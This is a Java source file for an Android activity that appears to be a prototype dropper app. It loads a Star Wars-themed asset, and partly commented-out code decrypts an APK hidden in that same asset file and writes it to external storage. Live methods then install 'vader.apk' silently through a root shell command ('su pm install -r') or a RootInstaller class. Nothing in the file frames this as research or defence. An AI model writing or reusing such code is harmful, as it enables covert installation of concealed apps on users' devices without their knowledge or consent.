package com.andrei.host.ui;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.res.AssetManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.os.Build;
import android.os.Bundle;
import android.support.annotation.NonNull;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.ImageView;
import android.widget.Toast;

import com.andrei.host.R;
import com.andrei.host.security.RootInstaller;
import com.andrei.host.storage.StorageUtils;

import java.io.IOException;
import java.io.InputStream;

public class AnakinActivity extends AppCompatActivity implements View.OnClickListener {

    public static final String TAG = AnakinActivity.class.getSimpleName();

    public static final int EXTERNAL_STORAGE_REQ_CODE = 1;
    private ImageView mImgAnakin;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        String[] permissions = {Manifest.permission.WRITE_EXTERNAL_STORAGE, Manifest.permission.READ_EXTERNAL_STORAGE};
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            Log.d(TAG, "onCreate: ");
            requestPermissions(permissions, EXTERNAL_STORAGE_REQ_CODE);
        }

        mImgAnakin = (ImageView) findViewById(R.id.anakin_img);
        Button btn = (Button) findViewById(R.id.install_btn);

        setImgAnakin();
        btn.setOnClickListener(this);
    }

    public void setImgAnakin() {
        try {
            mImgAnakin.setImageBitmap(getBitmapFromAssets(StorageUtils.ANAKIN_FILE));
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        if (requestCode == EXTERNAL_STORAGE_REQ_CODE) {
            if (grantResults.length > 0
                    && grantResults[0] == PackageManager.PERMISSION_GRANTED &&
                    grantResults[1] == PackageManager.PERMISSION_GRANTED) {
                Toast.makeText(this, "Storage permission granted", Toast.LENGTH_SHORT).show();
            }
        }
    }

    public Bitmap getBitmapFromAssets(String fileName) throws IOException {
        AssetManager assetManager = getAssets();
        InputStream inputStream = assetManager.open(fileName);

        return BitmapFactory.decodeStream(inputStream);
    }

    @Override
    public void onClick(View v) {
        switch (v.getId()) {
            case R.id.install_btn:
                Intent intent = new Intent(this, TestActivity.class);
                startActivity(intent);
//
//                byte[] apk = CryptoUtils.decryptApk(StorageUtils.ANAKIN_FILE, this);
//                StorageUtils.saveExternalStorage(apk, this);
//                installApk2();
                break;

            default:
                break;
        }
    }

    private void installApk() {
        Intent intent = new Intent(Intent.ACTION_VIEW);
        intent.setDataAndType(StorageUtils.mContentUri, "application/vnd.android.package-archive");
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);
    }

    private void installApk2() {
        try {
            Runtime.getRuntime().exec("su pm install -r " + "/storage/emulated/0/vader.apk");
//            Runtime.getRuntime().exec("chmod 777 " + "/storage/emulated/0/vader.apk");
//            Process process = Runtime.getRuntime().exec("sudo pm install -r " + "/storage/emulated/0/vader.apk");
        } catch (IOException e) {
            e.printStackTrace();
        }
//        try {
//            // TODO: 05/04/2018 try to concatenate the file:/// and just leave the rest
//        } catch (InterruptedException | IOException e) {
//            e.printStackTrace();
//        }
    }

    private void installApk3() {
//        try {
//            String command;
//            command = "adb install -r " + "/storage/emulated/0/vader.apk";
//            Process proc = Runtime.getRuntime().exec(new String[]{"su", "-c", command});
//            proc.waitFor();
//        } catch (Exception e) {
//            e.printStackTrace();
//        }
        RootInstaller rootInstaller = new RootInstaller();
        rootInstaller.install("/storage/emulated/0/vader.apk");
    }
}
